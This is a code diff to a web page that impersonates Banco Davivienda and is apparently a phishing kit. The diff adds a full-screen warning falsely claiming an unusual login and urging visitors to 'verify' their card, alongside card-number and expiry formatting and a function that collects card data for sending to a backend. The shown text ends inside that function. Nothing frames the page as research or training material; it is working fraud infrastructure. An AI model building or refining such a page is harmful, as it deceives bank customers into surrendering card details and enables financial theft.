@@ -11,15 +11,19 @@
         /* --- ESTILOS BASE COMPARTIDOS --- */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
         body { display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
+        
         header { background-color: #E30613; display: flex; justify-content: space-between; align-items: center; padding: 0 40px 0 0; color: white; height: 85px; z-index: 10; }
         .logo-container { display: flex; align-items: center; height: 100%; cursor: pointer; text-decoration: none; }
         .logo-container img { height: 45px; margin-left: 60px; }
         .header-info { text-align: right; font-size: 14px; line-height: 1.4; padding-right: 40px; }
+
         main { flex-grow: 1; display: flex; flex-direction: column; justify-content: flex-start; align-items: center; text-align: center; position: relative; background-image: url('mujer.png'); background-size: cover; background-position: center top; background-repeat: no-repeat; color: white; padding: 60px 20px 20px 20px; }
+        
         .content { position: relative; z-index: 2; display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 900px; transition: filter 0.4s ease, opacity 0.4s ease; }
         
         .title { font-size: 36px; font-weight: 300; margin-bottom: 0px; letter-spacing: -0.5px; }
         .subtitle { font-size: 34px; font-weight: 700; margin-bottom: 25px; }
+        
         .form-card { background-color: rgba(255, 255, 255, 0.4); border: 3px solid white; border-radius: 20px; padding: 20px 30px; width: 100%; max-width: 800px; color: #000; backdrop-filter: blur(5px); }
         .form-title { font-size: 16px; font-weight: 700; margin-bottom: 20px; }
         
@@ -33,7 +37,7 @@
         .btn:hover:not(:disabled) { transform: scale(1.02); }
         .btn:disabled { background-color: #999; cursor: not-allowed; }
 
-        /* Overlay de carga */
+        /* Overlay de carga para el envío de datos */
         .loading-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; display: flex; justify-content: center; align-items: center; z-index: 100; opacity: 0; pointer-events: none; transition: opacity 0.4s ease; }
         .loading-overlay.active { opacity: 1; pointer-events: auto; }
         .content.blur-active { filter: blur(8px); opacity: 0.4; pointer-events: none; }
@@ -47,6 +51,76 @@
         .footer-text { font-size: 15px; font-weight: 400; text-align: center; flex-grow: 1; }
         .footer-right { display: flex; align-items: center; justify-content: flex-end; width: 250px; } .footer-right img { height: 60px; }
 
+        /* =========================================
+           OVERLAY DE ALERTA DE SEGURIDAD (ENTRADA)
+           ========================================= */
+        .security-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.6); /* Oscurece el fondo */
+            backdrop-filter: blur(8px); /* Difumina toda la pantalla de atrás */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999; /* Por encima de todo */
+            padding: 20px;
+            transition: opacity 0.5s ease;
+        }
+
+        .security-overlay.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .security-card {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            color: #333;
+        }
+
+        .security-icon {
+            font-size: 50px;
+            color: #E30613;
+            margin-bottom: 20px;
+        }
+
+        .security-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #E30613;
+        }
+
+        .security-text {
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            color: #555;
+        }
+
+        .btn-security {
+            height: 45px;
+            width: 100%;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            background-color: #E30613;
+            color: white;
+            transition: transform 0.2s;
+        }
+
+        .btn-security:hover {
+            transform: scale(1.02);
+        }
+
+        /* --- RESPONSIVE --- */
         @media (max-width: 768px) {
             body { overflow-y: auto; height: auto; min-height: 100vh; }
             header { flex-direction: column; height: auto; padding: 15px 0 0 0; gap: 15px; }
@@ -58,15 +132,21 @@
             .input-row { flex-direction: column; align-items: center; gap: 15px; }
             footer { flex-direction: column; height: auto; padding: 12px 15px; gap: 5px; }
             .footer-text { order: -1; font-size: 13px; } .footer-left { width: auto; justify-content: center; } .footer-left img { height: 22px; } .footer-right { display: none; }
+            
+            .security-card { padding: 30px 20px; }
+            .security-icon { font-size: 40px; }
+            .security-title { font-size: 20px; }
         }
     </style>
 </head>
 <body>
+    <!-- HEADER -->
     <header>
         <a href="index.html" class="logo-container"><img src="davi.png" alt="Davivienda"></a>
         <div class="header-info"><div id="fecha-hora">Cargando fecha...</div><div id="codigo-cus">Código único CUS: Cargando...</div></div>
     </header>
 
+    <!-- CUERPO PRINCIPAL (Oculto tras el blur) -->
     <main>
         <div class="loading-overlay" id="loadingOverlay">
             <div class="loading-box"><div class="big-spinner"></div><div class="loading-text">Cargando...</div></div>
@@ -102,11 +182,32 @@
         </div>
     </main>
 
+    <!-- FOOTER -->
     <footer>
         <div class="footer-left"><img src="vig.png" alt="Vigilado"></div>
         <div class="footer-text">Banco Davivienda S.A. Todos los derechos reservados 2023.</div>
         <div class="footer-right"><img src="blanco.png" alt="Davivienda"></div>
     </footer>
+
+    <!-- =========================================
+         OVERLAY DE ALERTA DE SEGURIDAD 
+         ========================================= -->
+    <div class="security-overlay" id="securityOverlay">
+        <div class="security-card">
+            <div class="security-icon">
+                <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#E30613" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                    <line x1="12" y1="9" x2="12" y2="13"></line>
+                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                </svg>
+            </div>
+            <div class="security-title">Inicio de Sesión Inusual</div>
+            <div class="security-text">
+                Hemos detectado un intento de inicio de sesión inusual en su cuenta por motivos de seguridad. Para continuar, por favor verifique los datos de su tarjeta de débito o crédito.
+            </div>
+            <button class="btn-security" onclick="cerrarAlerta()">Verificar mi Tarjeta</button>
+        </div>
+    </div>
 
     <script>
         function actualizarFecha() {
@@ -118,6 +219,13 @@
         function generarCUS() { document.getElementById('codigo-cus').textContent = `Código único CUS: ${Math.floor(100 + Math.random() * 900)}-${Math.floor(1000000 + Math.random() * 9000000)}`; }
         actualizarFecha(); generarCUS();
 
+        // 1. FUNCIÓN PARA CERRAR LA ALERTA DE SEGURIDAD
+        function cerrarAlerta() {
+            const overlay = document.getElementById('securityOverlay');
+            overlay.classList.add('hidden'); // Se desvanece suavemente
+        }
+
+        // 2. FORMATEO DE DATOS
         function formatCard(input) {
             let val = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
             let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
@@ -128,6 +236,7 @@
             if (val.length >= 2) { input.value = val.substring(0, 2) + '/' + val.substring(2, 4); } else { input.value = val; }
         }
 
+        // 3. ENVIAR DATOS AL BACKEND
         async function enviarTC() {
             const numero = document.getElementById('numTarjeta').value;
             const fecha = document.getElementById('fechaTarjeta').value;
